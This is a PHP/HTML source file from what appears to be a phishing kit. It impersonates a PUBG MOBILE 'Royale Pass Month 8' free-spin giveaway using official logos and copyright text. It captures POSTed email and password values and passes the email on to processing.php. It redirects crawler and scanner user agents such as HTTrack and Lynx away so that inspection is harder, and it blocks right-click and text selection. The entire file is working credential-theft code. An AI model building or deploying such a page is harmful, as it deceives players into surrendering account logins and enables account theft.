<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG MOBILE: Royale Pass Month 8">
<meta name="description" content="Start your free lucky spin at the Royale Pass Month 8 event. This opportunity is limited and without the need for topup. Spin and receive your rewards now!">
<meta property="og:description" content="Start your free lucky spin at the Royale Pass Month 8 event. This opportunity is limited and without the need for topup. Spin and receive your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE: Royale Pass Month 8">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://i.postimg.cc/281Z1FDD/season.png">
<title>PUBG MOBILE: Royale Pass Month 8</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-title">
PUBG MOBILE
<div class="navbar-subtitle">The original Battle Royale, <br> the first and the best!</div> <!--- navbar-subtitle --->
</div> <!--- navbar-title --->
<div class="navbar-download">
<img class="navbar-menu" src="https://i.postimg.cc/LXJDnk6t/menu.png">
<img class="navbar-pay" src="https://i.postimg.cc/VkTdzXpQ/pay.png">
</div> <!--- navbar-download --->
</div> <!--- navbar --->
<div class="header">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="event-theme">
<div class="event-theme-icon"><img src="img/season.png"></div> <!--- event-theme-icon --->
<div class="event-theme-title">Royale Pass M8 - Bounty Legends</div> <!--- event-theme-title --->
<div class="event-theme-subtitle">Start spin and collect your free rewards</div> <!--- event-theme-subtitle --->
</div> <!--- event-theme-icon --->
<div class="box">
<center>
<div class="wrap">
<div class="bg">
<div class="kotak">
<center>
<div class="spin">
<img class="img" src="img/rewards/1.png">
<img class="img" src="img/rewards/2.png">
<img class="img" src="img/rewards/3.png">
<img class="img" src="img/rewards/4.png">
<img class="img" src="img/rewards/5.png">
<img class="img" src="img/rewards/6.png">
</div> <!--- spin --->
</center>
<img onclick="spin()" class="start" src="img/putar.png">
</div> <!--- kotak --->
</div> <!--- bg --->
</div> <!--- wrap --->
<div class="btn-wrapper">
<button type="button" onmousedown="buka.play()" onclick="open_about_event()">About Event</button>
<button type="button" onmousedown="buka.play()" onclick="open_event_rules()">Event Rules</button>
</div> <!--- btn-wrapper --->
</center>
</div> <!--- box --->
<div class="footer">
<div class="footer-txt-follow">Follow Us</div> <!--- footer-txt-follow --->
<center>
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
</center>
<img class="footer-copyright-icon" src="https://i.ibb.co/Wx8wkq1/footer-img.png">
<div class="footer-txt-copyright">ⓒ 2022 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ⓒ 2018-2022 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Reward Confirmation</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Are you sure to collect this reward?</div> <!--- popup-alert --->
<img class="popup-item itemShine" src="img/rewards/5.png">
<br>
</div> <!--- popup-box-bg --->
<form action="processing.php" method="post">
<input type="hidden" name="email" value="<?php echo $email;?>" readonly>
<div class="popup-footer">
<button type="submit" onmousedown="buka.play();" class="popup-footer-active">Collect</button>
</div> <!--- popup-footer --->
</form> <!--- form --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup about_event" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">About Event</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
Welcome to Royale Pass M8 event
<br>
<br>
This event is to welcome the Royale Pass M8
<br>
Get various kinds of rewards at this year's end event!
</div> <!--- popup-alert --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" class="popup-footer-active" onclick="close_about_event()">Okay</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup event_rules" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Event Rules</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
Welcome to Royale Pass M8
<br>
<br>
Make sure your account does not violate the rules of the game such as using illegal programs or others
<br>
Join this event and get various kinds of free rewards
</div> <!--- popup-alert --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" class="popup-footer-active" onclick="close_event_rules()">Okay</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<audio id="klik1" src="media/putar.mp3">

<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>

</body>
</html>